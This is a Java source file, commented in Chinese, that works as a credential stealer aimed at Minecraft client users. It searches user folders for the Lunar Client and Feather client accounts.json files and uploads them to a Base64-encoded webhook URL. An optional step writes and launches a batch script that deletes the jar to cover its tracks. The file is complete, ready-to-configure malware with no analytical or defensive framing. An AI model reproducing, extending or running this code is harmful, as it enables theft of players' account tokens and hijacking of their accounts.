package com.nontage;

import okhttp3.*;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;

public class Main {
    private static String webhook_url = "";
    private static boolean delete_self = false; //執行完後是否刪除檔案
    private static String rootPathC = "C:\\Users"; //要尋找的硬碟 你可以新增其他的
    private static int maxDepth; //不要動它
    public static void main(String[] args) throws IOException {
        webhook_url = decodeBase64(webhook_url);
        if (webhook_url == null || webhook_url.isEmpty()) {
            System.out.println("[ERROR] The Webhook Url cannot be empty!");
            return;
        }
        System.out.println("code running");
        maxDepth = 2; //資料夾搜索層數上限 越大跑越久
        findAndPrintFolderPathForLunar(new File(rootPathC), 0, maxDepth);
        findAndPathFolderPathForFeather(new File(rootPathC), 0, maxDepth);
        if (!delete_self) {
            return;
        }
            String scriptContent = "@echo off\n" +
                    "ping 127.0.0.1 -n 2 > nul\n" +
                    "del test.jar\n" + //<File name>改成你這個jar的名字 否則不會刪掉
                    "del cleanup_script.bat";

            try {
                Path scriptPath = Paths.get("cleanup_script.bat");
                Files.write(scriptPath, scriptContent.getBytes());
            } catch (IOException e) {
                e.printStackTrace();
            }
        String currentDirectory = System.getProperty("user.dir");
        System.out.println("目前工作目錄：" + currentDirectory);
        File batFile = new File(currentDirectory + "\\cleanup_script.bat");
        Desktop.getDesktop().open(batFile);
        System.exit(0);
    }
    private static String decodeBase64(String webhook_url) { //解碼Base64
        byte[] decodeBytes = Base64.getDecoder().decode(webhook_url);
        String decodeWebhookUrl = new String(decodeBytes, StandardCharsets.UTF_8);
        return decodeWebhookUrl;
    }
    public static void findAndPrintFolderPathForLunar(File folder, int currentDepth, int maxDepth) { //搜索lunar client的資料夾
        if (currentDepth > maxDepth) {
            return;
        }
        if (folder.exists() && folder.isDirectory()) {
            if (folder.getName().equalsIgnoreCase(".lunarclient")) {
                System.out.println("成功找到檔案位置");
                String path = folder.getAbsolutePath() + "\\settings\\game\\accounts.json";
                System.out.println(path);
                File accounts = new File(path);
                sendFileToWebhook(webhook_url,  accounts);
            }

            File[] files = folder.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        findAndPrintFolderPathForLunar(file, currentDepth + 1, maxDepth);
                    }
                }
            }
        }
    }
    public static void findAndPathFolderPathForFeather(File folder, int currentDepth, int maxDepth) {
        if (currentDepth > maxDepth) {
            return;
        }
        if (folder.exists() && folder.isDirectory()) {
            if (folder.getName().equalsIgnoreCase("AppData")) {
                File featherFolder = new File(folder, "Roaming\\.feather");
                if (featherFolder.exists() && featherFolder.isDirectory()) {
                    System.out.println("成功找到檔案位置");
                    String path = featherFolder.getAbsolutePath() + "\\accounts.json";
                    System.out.println(path);
                    File accounts = new File(path);
                    sendFileToWebhook(webhook_url, accounts);
                }
            }

            File[] files = folder.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        findAndPathFolderPathForFeather(file, currentDepth + 1, maxDepth);
                    }
                }
            }
        }
    }


    public static void sendFileToWebhook(String webhookUrl, File file) {
        OkHttpClient httpClient = new OkHttpClient();
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                .build();

        Request request = new Request.Builder()
                .url(webhookUrl)
                .post(requestBody)
                .build();

        try (Response response = httpClient.newCall(request).execute()) {
            System.out.println("Webhook 回應：" + response.code() + " " + response.message());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}